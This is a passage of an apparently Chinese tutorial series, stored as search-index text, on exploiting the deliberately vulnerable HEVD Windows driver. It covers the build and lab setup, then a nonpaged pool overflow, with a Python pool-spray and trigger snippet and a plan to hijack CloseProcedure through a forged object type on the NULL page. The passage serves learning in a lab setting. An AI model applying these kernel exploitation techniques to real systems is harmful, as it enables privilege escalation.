\u7f16\u8bd1\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u5176\u5b9e\u5e94\u8be5\u5f88\u7b80\u5355\uff0c\u6bd5\u7adf\u5199\u9879\u76ee\u7684\u4eba\u90fd\u628a\u9879\u76ee\u5199\u6210\u8fd9\u6837\u4e86\uff0c\u4f46\u7531\u4e8e\u7f51\u4e0a\u7684\u6559\u7a0b\u5927\u90e8\u5206\u90fd\u6ca1\u5199\u5f97\u592a\u8be6\u7ec6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u7136\u540e\u8017\u8d39\u5f88\u591a\u65f6\u95f4 \u9996\u5148\u770b\u5230 github \u4e0a\u7684\u6587\u6863 \u4e0a\u9762\u8bf4\u76f4\u63a5\u8fd0\u884c.bat\u6587\u4ef6\u5c31\u53ef\u4ee5\u4e86\uff0c\u4eb2\u6d4b\u4e86\u4e00\u4e0b\u53d1\u73b0\u7f16\u8bd1\u94fe\u63a5\u8fc7\u7a0b\u7528\u7684 Cmake\uff0c\u5176\u4e2d\u4f3c\u4e4e\u8fd8\u9700\u8981 Ninja\uff0c\u4e0d\u592a\u6e05\u695a\u6bd5\u7adf\u6211\u6ca1\u7528\u8fc7 Cmake \u7f16\u8bd1\u4e1c\u897f\uff0c\u8fd9\u91cc\u6211\u9009\u62e9\u7528 VS \u8fdb\u884c\u7f16\u8bd1\u3002 \u4e2a\u4eba\u7684\u7248\u672c\u662f Visual Studio 2015\uff0c\u7136\u540e\u770b\u5230\u7b2c\u4e8c\u6b65\uff0c \u7f16\u8bd1\u9a71\u52a8\u7a0b\u5e8f\u5f53\u7136\u9700\u8981 WDK \u4e86\uff0c\u8be5\u94fe\u63a5\u6307\u5411\u5b98\u7f51\u3002 \u8fd9\u91cc\u5148\u8bf4\u660e\u4e00\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u5148\u770b\u4e24\u5f20\u56fe WDK \u7684\u7248\u672c\u8ddf\u968f\u7684\u5e94\u8be5\u662f Visual Studio \u7684\u7248\u672c\u800c\u4e0d\u662f Windows \u7684\u7248\u672c \u6bd4\u5982\u8bf4\u6211\u7684\u7535\u8111\u88c5\u7684\u662f Visual Studio 2015\uff0c\u90a3\u4e48\u770b\u5230\u7b2c\u4e00\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u88c5 Windows 10 1703 \u6216 Windows 10 1607 \u7248\u672c\u7684WDK\uff0c\u7136\u540e\u53bb\u7b2c\u4e8c\u5f20\u56fe\u4e0a\u7684\u94fe\u63a5\u4e0b\u8f7dWDK\u3002 \u8fd9\u91cc\u4eb2\u6d4b\u5bf9 Visual Studio 2015 \u6765\u8bf4\uff0c1703 \u7684\u90a3\u4e2a\u7248\u672c\u662f\u53ef\u7528\u7684\u3002 \u4e0b\u8f7d\u4e0b\u6765\u7684 WDK \u7248\u672c\u53f7\u4e3a10.0.15063.X \u88c5\u597d\u4e86 WDK \u540e\u7528 VS \u6253\u5f00 Driver \u6587\u4ef6\u5939\u4e0b\u7684.sln\u6587\u4ef6\uff0c\u9009\u62e9\u597d\u5bf9\u5e94\u7684\u914d\u7f6e\u540e\uff08\u6bd4\u5982 release vulnerable x86\uff09 \u5c31\u53ef\u4ee5\u5f00\u59cb build \u4e86\uff0c\u4f46\u662f\u8fd9\u65f6\u5019\u7f16\u8bd1\u5176\u5b9e\u662f\u4f1a\u62a5\u9519\u7684\uff0c\u539f\u56e0\u662f\u6ca1\u6709\u5b89\u88c5 WSDK\uff0c\u8fd9\u91cc\u7ed9\u51fa WSDK\u7684\u4e0b\u8f7d\u94fe\u63a5 \u3002 \u6ce8\u610f WSDK \u7684\u7248\u672c\u4e00\u5b9a\u8981\u548c WDK \u7684\u7248\u672c\u76f8\u5bf9\u5e94\uff0c\u6bd4\u5982\u5728\u6211\u7684\u73af\u5883\u4e0b\u6211\u5b89\u88c5\u7684 SDK \u7248\u672c\u4e3a10.0.15063.X \uff08\u5982\u679c\u6ca1\u6709\u7684\u8bdd\u5c31\u7565\u8fc7\u53bb\u5427\uff09\u63a5\u4e0b\u518d\u6b21\u7f16\u8bd1\uff0c\u53c8\u4f1a\u770b\u5230\u8bf4\u627e\u4e0d\u5230\u53eb HEVD.cer \u7684 TestCertificate \u8fd9\u6837\u4e00\u4e2a\u62a5\u9519\u4fe1\u606f\u3002\u5176\u539f\u56e0\u662f\u56e0\u4e3a\u73b0\u5728 Windows \u7684\u9a71\u52a8\u7a0b\u5e8f\u662f\u9700\u8981\u7b7e\u540d\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Windows \u7684\u6d4b\u8bd5\u8bc1\u4e66\u6765\u8fdb\u884c\u7b7e\u540d\uff0c\u4e00\u4e2a\u662f\u4fee\u6539\u5f15\u5bfc\u65f6\u7684\u914d\u7f6e\u4fe1\u606f\u6765\u4f7f\u7528\u6d4b\u8bd5\u8bc1\u4e66\u4e3a\u9a71\u52a8\u7a0b\u5e8f\u8fdb\u884c\u7b7e\u540d\uff0c\u4f46\u6211\u611f\u89c9\u8fd9\u6837\u592a\u66b4\u529b\u4e86\uff0c\u53e6\u4e00\u4e2a\u65b9\u6cd5\u662f\u7f16\u8bd1\u65f6\u751f\u6210\u6d4b\u8bd5\u8bc1\u4e66\u5e76\u4f7f\u7528\u5b83\u6765\u8fdb\u884c\u7b7e\u540d\uff0c\u5177\u4f53\u64cd\u4f5c\u65b9\u6cd5\u662f\u5728 VS \u4e2d\u7684 project - properties - driver signing \u4e2d\u6dfb\u52a0\u6d4b\u8bd5\u8bc1\u4e66\uff0c\u5982\u56fe\u6240\u793a \u70b9\u7ea2\u5708\u90a3\u91cc \u81f3\u6b64\u5c31\u53ef\u4ee5\u770b\u5230\u5728\u65b0\u751f\u6210\u7684\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u4e86.sys\u6587\u4ef6\u4e86\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u8981\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u5f53\u7136\u82e5\u4e0d\u60f3\u5728\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\u7684\u540c\u65f6\u53c8\u7ed5\u8fc7\u4e00\u6b21 GS \u4fdd\u62a4\uff0c\u6211\u4eec\u5728\u7f16\u8bd1\u4e4b\u524d\u5e94\u8be5\u5148\u5173\u95ed GS \u9009\u9879","title":"hevd"},{"location":"HEVD/buildEnv/#osrloader","text":"\u751f\u6210\u4e86.sys\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u540e\u6700\u540e\u628a\u5b83\u653e\u5230\u865a\u62df\u673a\u4e0a\u542f\u52a8\u670d\u52a1\u5c31\u884c\u4e86\uff0c\u8fd9\u5c31\u662fOSRLoader\u7684\u4f5c\u7528\u3002 \u5230\u5b98\u7f51\u4e0a\u4e0b\u8f7d OSRLoader \u5b89\u88c5\u5b8c\u4e86\u4e4b\u540e\u6253\u5f00\u5230 Projects\\OsrLoader\\kit \u76ee\u5f55\u4f60\u53ef\u4ee5\u770b\u5230\u597d\u51e0\u4e2a\u6587\u4ef6\u5939\uff0c\u5bf9\u5e94\u5728\u4e0d\u540c\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684 OSRLoader \u7248\u672c\u3002\u6211\u7684\u76ee\u6807\u7cfb\u7edf\u662f win7\uff0c \u6240\u4ee5\u5e94\u8be5\u6253\u5f00 WNET \u6587\u4ef6\u5939\u4e0b\u7684OSRLoader\u3002 \u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\u5176\u5b83\u51e0\u4e2a\u6587\u4ef6\u5939\u7684\u76ee\u6807\u64cd\u4f5c\u7cfb\u7edf w2k: windows 2000 WLH: windows vista WNET: windows 7 \u53ca\u4ee5\u4e0a WXP: windows XP \u8fd8\u6709\u4e00\u70b9\u5c31\u662f\u9009\u62e9\u5b8c path \u4e4b\u540e\uff0c\u5e94\u8be5\u5148\u70b9\u51fb\u6ce8\u518c\u670d\u52a1\u518d\u70b9\u51fb\u5f00\u59cb\u670d\u52a1\u3002","title":"OSRLoader"},{"location":"HEVD/buildEnv/#0x02","text":"\u6253\u5f00 vmmon \u6253\u5f00\u865a\u62df\u673a \u6253\u5f00 windbg \u5e76\u8fde\u63a5 \u82e5 windbg \u8fde\u63a5\u6210\u529f\u5219\u8bf4\u660e virtualkd \u8d77\u4f5c\u7528\u4e86\u3002 \u63a5\u4e0b\u6765\u7528 OSRLoader \u52a0\u8f7d\u9a71\u52a8\u7a0b\u5e8f\uff0c\u7136\u540e\u5728 windbg \u4e2d\u8f93\u5165\u547d\u4ee4 lm m h* \u5982\u679c\u80fd\u5728\u8f93\u51fa\u4e2d\u770b\u5230 HEVD \u6a21\u5757\uff0c\u5219\u8bf4\u660e\u73af\u5883\u642d\u5efa\u6210\u529f\u4e86\u3002 \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b lm m h* \u547d\u4ee4 \u800c h* \u5c31\u662f\u4e00\u4e2a\u901a\u914d\u7b26","title":"0x02 \u6d4b\u8bd5\u73af\u5883\u662f\u5426\u642d\u5efa\u6210\u529f"},{"location":"HEVD/buildEnv/#0x03","text":"\u8be5\u73af\u5883\u7528\u4e8e\u4e4b\u540e\u7684 HEVD \u6f0f\u6d1e\u5229\u7528\u7684\u5b66\u4e60 2019.8.25","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"HEVD/homePage/","text":"\u672c\u7cfb\u5217\u7684\u5185\u5bb9\u4e3aHEVD\u73af\u5883\u4e0b\u7684\u6f0f\u6d1e\u5229\u7528\u5b66\u4e60 HEVD \u7684\u5168\u79f0\u4e3a HackSys Extreme Vulnerable Drive\uff0c\u662f github \u4e0a\u7684\u4e00\u4e2a\u9879\u76ee\u3002\u8be5\u9879\u76ee\u662f\u4e00\u4e2a\u6545\u610f\u88ab\u8bbe\u8ba1\u4e3a\u5305\u542b\u591a\u79cd\u6f0f\u6d1e\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4ee5\u6b64\u4f9b\u5b89\u5168\u7231\u597d\u8005\u6765\u63d0\u5347\u4ed6\u4eec\u5728\u5185\u6838\u5c42\u9762\u7684\u6f0f\u6d1e\u5229\u7528\u80fd\u529b\u3002 HEVD \u6db5\u76d6\u4e86\u4ece\u7b80\u5355\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5230\u590d\u6742\u7684UAF\u3001\u6c60\u6ea2\u51fa\u548c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u80fd\u591f\u4e86\u89e3\u5404\u79cd\u6f0f\u6d1e\u7684\u5229\u7528\u6280\u672f\u3002 \u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u5f88\u9002\u5408\u50cf\u6211\u4e00\u6837\u7684\u65b0\u624b\u4f5c\u4e3a\u5b66\u4e60 Windows \u7684\u5165\u95e8\u9879\u76ee\u3002\u7531\u4e8e\u672c\u4eba\u6c34\u5e73\u6709\u9650\uff0c\u6587\u7ae0\u4e2d\u51fa\u73b0\u7684\u4efb\u4f55\u9519\u8bef\u6b22\u8fce\u5e08\u5085\u4eec\u6279\u8bc4\u6307\u6b63\u3002","title":"Home Page"},{"location":"HEVD/nonPagedpooloverflow/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790\u5229\u7528 0x01 \u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790 \u9996\u5148\u6253\u5f00 BufferOverflowNonPagedPool.c \u6587\u4ef6 \u6211\u4eec\u53ef\u4ee5\u5f88\u660e\u663e\u5730\u53d1\u73b0\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u3002\u51fd\u6570\u63a5\u53d7\u6211\u4eec\u7684\u7528\u6237 buffer \u5e76\u76f4\u63a5\u5c06\u7528\u6237 buffer \u590d\u5236\u5230\u521a\u5206\u914d\u7684\u975e\u6362\u9875\u6c60\u4e2d\u3002 emmmm \u90a3\u73b0\u5728\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a bug \u4f46\u662f\u8fd9\u4e2a\u6f0f\u6d1e\u6709\u529e\u6cd5\u5229\u7528\u5417\uff1f\u5b83\u53c8\u4e0d\u50cf\u5728\u6808\u4e2d\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6 eip \u6765\u63a7\u5236\u6307\u4ee4\u6d41\uff0c\u5728\u975e\u6362\u9875\u6c60\u4e2d\u9020\u6210\u6ea2\u51fa\u9664\u4e86\u84dd\u5c4f\u5916(\u662f\u7684\uff0c: )\u82e5\u6211\u4eec\u4fee\u6539\u4e86\u4e0d\u8be5\u6539\u7684\u4e1c\u897f\uff0c\u6bd4\u5982\u8bf4\u6c60\u5934\uff0c\u9a6c\u4e0a\u5c31\u84dd\u5c4f\u4e86\uff0c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u8bd5\u8bd5\uff0c\u53cd\u6b63\u73a9 windows \u7ecf\u5e38\u7ed9\u6574\u5d29\uff0c\u8fd8\u597d\u6709\u865a\u62df\u673a)\u6211\u4eec\u6709\u529e\u6cd5\u63a7\u5236\u6307\u4ee4\u6d41\u5417\uff1f \u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002\u4e0d\u8fc7\u9996\u5148\u6211\u4eec\u5148\u8865\u5145\u70b9\u77e5\u8bc6\u3002 \u5f53\u6211\u4eec\u901a\u8fc7 CreateXXX(\u6bd4\u5982\u8bf4 CreateEvent, CreateFile \u7b49\u7b49)\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7533\u8bf7\u4e00\u5757\u533a\u57df\u6765\u4fdd\u5b58\u8fd9\u4e2a\u5bf9\u8c61 \u6bd4\u5982\u6211\u4eec\u901a\u8fc7\u8fd9\u4e48\u4e00\u6bb5\u5c0f\u4ee3\u7801\u6765\u521b\u5efa Event \u5bf9\u8c61\u8bd5\u8bd5: import ctypes , sys , struct from ctypes import * from subprocess import * def main (): kernel32 = windll . kernel32 ntdll = windll . ntdll hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) buf = A * 504 buf_ad = id ( buf ) + 20 spray_event1 = [] for i in xrange ( 20 ): spray_event1 . append ( kernel32 . CreateEventA ( None , False , False , None )) kernel32 . DeviceIoControl ( hevDevice , 0x22200f , buf_ad , len ( buf ), None , 0 , byref ( c_ulong ()), None ) if __name__ == __main__ : main () \uff08\u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u5206\u914d 20 \u4e2a Event \u5bf9\u8c61\uff0c\u662f\u56e0\u4e3a\u975e\u6362\u9875\u6c60\u6781\u6709\u53ef\u80fd\u975e\u5e38\u7684\u96f6\u788e\uff0c\u7b49\u4f1a\u513f\u6211\u4eec\u5c55\u793a TriggerBufferOverflowNonPagedPool \u51fd\u6570\u5206\u914d\u7684\u975e\u6362\u9875\u6c60\u9644\u8fd1\u7684\u7a7a\u95f4\u4e2d\u90fd\u53ef\u80fd\u6839\u672c\u770b\u4e0d\u5230 Event\uff0c\u591a\u5206\u914d\u4e00\u70b9\u597d\u627e\u4ec5\u6b64\u800c\u5df2\uff09\u4e0b\u597d\u65ad\u70b9\u540e\u6211\u4eec\u8fd0\u884c\u4e00\u4e0b\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u5728 windbg \u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230 \u547d\u4ee4\u662f !pool 0x85EABDC8 \u6211\u4eec\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230\u6807\u7b7e\u4e3a Hack \u7684\u662f\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\uff0c\u6807\u7b7e\u4e3a Even(t) \u4e14 size \u4e3a 40 \u7684\u662f\u6211\u4eec\u7684\u4ee3\u7801\u5206\u914d\u7684\u7a7a\u95f4\u3002\u5f53\u7136\u6c60\u4e2d\u53ef\u80fd\u8fd8\u6709\u5176\u5b83\u6807\u7b7e\u4e3a Even \u4f46\u662f size \u4e0d\u4e3a 40 \u7684\u5bf9\u8c61\uff0c\u90a3\u4e0d\u662f\u6211\u4eec\u5206\u914d\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48 size \u4e0d\u4e00\u6837\u662f\u56e0\u4e3a\u521b\u5efa\u7684\u573a\u666f\u548c\u4f20\u5165\u7684\u53c2\u6570\u90fd\u4f1a\u5f71\u54cd\u5230\u8fd9\u4e2a\u503c\u3002\u90a3\u4e3a\u4ec0\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 size \u4e3a 40 \u7684\u5c31\u662f\u6211\u4eec\u521b\u5efa\u7684\u5462\uff1f\u7b49\u4f1a\u513f spray \u7684\u65f6\u5019\u4f60\u770b\u5230\u90a3\u4e00\u5927\u5806\u7684 Even \u5c31\u53ef\u4ee5\u5f88\u663e\u7136\u5730\u77e5\u9053\u90a3\u662f\u6211\u4eec\u521b\u5efa\u7684\u4e86\uff0c\u90a3\u4e00\u5806 Even \u7684 size \u90fd\u662f 40\u3002 \u73b0\u5728\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u7ed3\u6784 \u7ea2\u8272\u90e8\u5206\u4e3a pool header \u9ec4\u8272\u90e8\u5206\u4e3a object header quota info \u84dd\u8272\u90e8\u5206\u4e3a object header \u7eff\u8272\u90e8\u5206\u4e3a object body \u8fd9\u5c31\u662f Even \u5bf9\u8c61\u7684 40 \u4e2a size \u7684\u5168\u90e8\u6784\u6210\u3002\u6211\u89c9\u5f97\u5176\u5b83\u7684\u90fd\u5e94\u8be5\u5f88\u597d\u7406\u89e3\uff0cheader + body \u561b\u3002\u4f46\u662f\u90a3\u4e2a quota info \u662f\u4ec0\u4e48\u9b3c\uff1f \u5728\u5bf9\u8c61\u4e2d\uff0c\u5bf9\u8c61\u5934\u7684\u4e0a\u65b9\u53ef\u80fd\u5b58\u5728\u53ef\u9009\u7684\u5934\u90e8\u4fe1\u606f\uff08\u4e5f\u79f0\u4e3a\u5b50\u5934\u90e8\uff09\uff0c\u53ef\u9009\u7684\u5934\u90e8\u4fe1\u606f\u4e00\u5171\u6709\u8fd9\u4e48\u51e0\u79cd\uff1a process info quota info handle info name info creator info \u63a9\u7801 0x10 0x08 0x04 0x02 0x01 \u5927\u5c0f 0x08 0x10 0x08 0x10 0x10 \u5728\u5bf9\u8c61\u521b\u5efa\u7684\u65f6\u5019\uff0c\u6839\u636e\u5bf9\u8c61\u7684\u79cd\u7c7b\u3001\u521b\u5efa\u7684\u573a\u666f\u4ee5\u53ca\u4f20\u5165\u7684\u53c2\u6570\u4e0d\u540c\uff0c\u53ef\u9009\u5934\u90e8\u6709\u53ef\u80fd\u5b58\u5728\uff0c\u4e5f\u6709\u53ef\u80fd\u4e0d\u5b58\u5728\u3002\u5b58\u5728\u7684\u8bdd\u6709\u53ef\u80fd\u53ea\u5b58\u5728\u4e00\u4e2a\uff0c\u4e5f\u6709\u53ef\u80fd\u540c\u65f6\u5b58\u5728\u591a\u4e2a\u3002\u5177\u4f53\u5b58\u5728\u4e0e\u5426\u53ef\u4ee5\u770b\u5230 object header \u4e2d\u7684 InfoMask\uff0c\u5176\u6307\u793a\u4e86\u8be5\u5bf9\u8c61\u5b58\u5728\u4f55\u79cd\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u3002 \u6bd4\u5982\u8bf4\u4e0a\u56fe\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230 InfoMask \u6bb5\u7684\u503c\u4e3a 0x8\uff0c\u56e0\u6b64\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4e3a quota info\uff0c\u6b63\u597d\u662f 0x10 \u4e2a\u5b57\u8282\u3002 \u8bf4\u662f\u8fd9\u6837\u8bf4\uff0c\u4f46\u6211\u4eec\u4e00\u5f00\u59cb dd 85eabfc0 \u7684\u65f6\u5019\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5230\u5e95\u6709\u6ca1\u6709\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u6709\u591a\u5c11\u4e2a\u5462\uff1f\uff08\u56e0\u4e3a\u5047\u8bbe\u8bf4\u4f60\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u6709\u591a\u5c11\u4e2a\uff0c\u4f60\u5c31\u6839\u672c\u4e0d\u77e5\u9053 InfoMask \u7684\u504f\u79fb\u5230\u5e95\u662f\u591a\u5c11\uff09\u5982\u679c\u662f\u6b63\u7740\u5199\u7a0b\u5e8f\u7684\u8bdd\u6211\u4eec\u5f53\u7136\u77e5\u9053\u6211\u4eec\u662f\u5426\u6709\u521b\u5efa\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4ee5\u53ca\u90fd\u521b\u5efa\u4e86\u4ec0\u4e48\uff0c\u4f46\u6211\u4eec\u73b0\u5728\u662f\u76f4\u63a5\u9006\u7740\u6765\u901a\u8fc7\u770b\u6c60\u7ed3\u6784\u8fdb\u884c\u5206\u6790\u3002 \u8fd9\u4e2a\u53ea\u80fd\u8bf4\u770b\u7ecf\u9a8c\u4e86\uff0c\u4e00\u5171\u5c31\u4e24\u79cd\u5927\u5c0f\u7ec4\u4e00\u7ec4\u770b\u770b InfoMask \u5bf9\u4e0d\u5bf9\u5f97\u4e0a\uff0c\u82e5\u662f\u5bf9\u5f97\u4e0a\u7684\u8bdd\u4f60\u5c31\u77e5\u9053\u90fd\u521b\u5efa\u4e86\u4ec0\u4e48\u53ef\u9009\u5934\u90e8\u4fe1\u606f\u4e86\u3002 \u597d\u5230\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 Event \u5bf9\u8c61\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\u7ed3\u6784\u4e86\u3002\u63a5\u4e0b\u6765\u770b\u770b\u6211\u4eec\u611f\u5174\u8da3\u7684\u4e1c\u897f: TypeIndex \u6bb5\u3002 \u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u5176\u5bf9\u5e94\u7684\u79cd\u7c7b\uff0c\u8fd9\u70b9\u5728\u5bf9\u8c61\u5934\u4e2d\u7528 TypeIndex \u6bb5\u8fdb\u884c\u6807\u8bc6\u3002TypeIndex \u7684\u503c\u4ee3\u8868\u7740\u8be5\u5bf9\u8c61\u7684 object type \u5728 ObTypeIndexTable \u4e2d\u7684\u504f\u79fb\u3002 \u6bd4\u5982\u4e0a\u56fe\u7684 TypeIndex \u6bb5\u7684\u503c\u4e3a 0xc\uff0c\u90a3\u4e48\u5176 object type \u7684\u5730\u5740\u5728\u8868\u4e2d\u7684\u4f4d\u7f6e\u5c31\u662f\u7ea2\u6846\u4e2d\u7684\u4f4d\u7f6e\u3002 \u73b0\u5728\u6211\u4eec\u770b\u770b Event \u5bf9\u8c61\u7684 object type \u6211\u4eec\u611f\u5174\u8da3\u7684\u6570\u636e\u6bb5\u4e3a TypeInfo\uff0c\u4e0b\u56fe\u662f TypeInfo \u7684\u7ed3\u6784 \u770b\u5230\u7ea2\u6846\u4e2d\u7684\u90e8\u5206\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u56de\u8c03\u51fd\u6570\uff0c\u5176\u542b\u4e49\u4e3a\u5f53\u8be5\u79cd\u7c7b\u7684\u5bf9\u8c61 XXX \u65f6\u6240\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u597d\uff0c\u5230\u73b0\u5728\u5e94\u8be5\u5df2\u7ecf\u8865\u5145\u5b8c\u4e86\u6211\u4eec\u6240\u9700\u8981\u7684\u77e5\u8bc6\u4e86\u3002 \u56de\u5230\u4e00\u5f00\u59cb\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6709\u529e\u6cd5\u901a\u8fc7\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u6765\u63a7\u5236\u6307\u4ee4\u6d41\u5417\uff1f\u4e0a\u9762\u4e5f\u8bf4\u4e86\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981 \u4fdd\u8bc1\u6211\u4eec\u7684 kernel buffer \u540e\u7d27\u8ddf\u4e00\u4e2a Event \u5bf9\u8c61\u3002 \u4e3a\u4ec0\u4e48\u8981\u662f Event \u5bf9\u8c61\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u7684 kernel buffer \u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x200(0x1f8 + 0x8)\uff0c\u800c Event \u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x40\u30020x40 * 8 = 0x200\u3002\u8fd9\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u4e0b\u6587\u7684 pool spray \u4e00\u6587\u4e2d\u4f1a\u7ed9\u51fa\u89e3\u91ca\u3002 \u5982\u4f55\u4fdd\u8bc1\u6211\u4eec\u7684 kernel buffer \u540e\u7d27\u8ddf\u4e00\u4e2a Event \u5bf9\u8c61\u5462\uff1f\u8fd9\u53ef\u4ee5\u901a\u8fc7 pool spray \u6765\u5f97\u5230\u4fdd\u8bc1 \u901a\u8fc7\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 kernel buffer \u540e\u7d27\u8ddf\u7684 Event \u5bf9\u8c61\u7684 object header \u4e2d\u7684 TypeIndex \u7684\u503c\u4e3a 0x00 \u4e3a\u4ec0\u4e48\u8981\u8986\u76d6\u4e3a 0x00 \u5462\uff1f\u56e0\u4e3a\u663e\u7136\u6211\u4eec\u6ca1\u529e\u6cd5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u4fee\u6539 Event \u5bf9\u8c61\u7684 object type \u5b57\u6bb5\u7684\u503c\u3002\u4e0d\u8fc7\u770b\u5230 ObTypeIndexTable[0] \u7684\u503c\u4e3a 0x00000000\uff0c\u8fd9\u662f\u4e00\u4e2a NULL \u6307\u9488\uff0c\u6307\u5411\u7a7a\u6307\u9488\u533a\u3002\uff08x86 \u4e0b 0x00000000~0x0000FFFF \u662f\u4e00\u6bb5\u7a7a\u6307\u9488\u533a\uff0c\u7406\u8bba\u4e0a\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\uff0c\u5bf9\u5b83\u8fdb\u884c\u8bfb\u5199\u5c31\u4f1a\u62a5\u9519\uff0c\u7528\u6765\u9884\u9632\u7a0b\u5e8f\u5458\u5bf9 NULL \u6307\u9488\u8fdb\u884c\u64cd\u4f5c\uff09\u6211\u4eec\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u53ef\u4ee5\u901a\u8fc7 NtAllocateVirtualMemory \u6765\u5206\u914d\u8fd9\u6bb5\u5730\u5740\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u7528 WriteProcessMemory \u6765\u8986\u76d6\u8fd9\u6bb5\u5730\u5740\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u5728 0x00000000 \u5904\u4f2a\u9020\u4e00\u4e2a object type\uff0c\u6765\u4f7f kernel buffer \u540e\u7d27\u8ddf\u7684 Event \u5bf9\u8c61\u7684 TypeIndex \u6307\u5411\u8fd9\u4e2a object type \u5728 0x00000000 \u5904\u4f2a\u9020\u4e00\u4e2a object type\uff0c\u4f7f\u5b83\u7684 CloseProcedure \u6307\u5411\u6211\u4eec\u7684 shellcode \u8c03\u7528 CloseHandle \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode \u4fdd\u8bc1 kernel buffer \u540e\u7d27\u8ddf Event \u5bf9\u8c61 (pool spray) pool spray \u7ffb\u8bd1\u5e94\u8be5\u662f\u6c60\u55b7\u5c04\u3002\u5b83\u5206\u4e3a\u4e09\u6b65\u3002 \u7b2c\u4e00\u6b65\u901a\u8fc7\u5206\u914d\u5927\u91cf\u8f83\u5c0f\u7684\u975e\u6362\u9875\u6c60\u7a7a\u95f4\u6765\u586b\u8865\u975e\u6362\u9875\u6c60\u4e2d\u5b58\u5728\u7684\u788e\u7247\u3002\u5373\u4f7f\u4e4b\u540e\u8fd8\u5b58\u5728\u788e\u7247\u4e5f\u4e0d\u662f\u6211\u4eec\u7684 kernel buffer \u80fd\u653e\u5f97\u4e0b\u7684 \u901a\u8fc7\u7b2c\u4e00\u6b65\u7684\u94fa\u57ab\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u63a5\u4e0b\u6765\u5206\u914d\u7684\u7a7a\u95f4\u662f\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u7b2c\u4e8c\u6b65\u4e3a\u5206\u914d\u4e00\u6bb5\u8fde\u7eed\u7684\u7a7a\u95f4\u8bb0\u4e3a x\u3002 \u7b2c\u4e09\u6b65\u5728 x 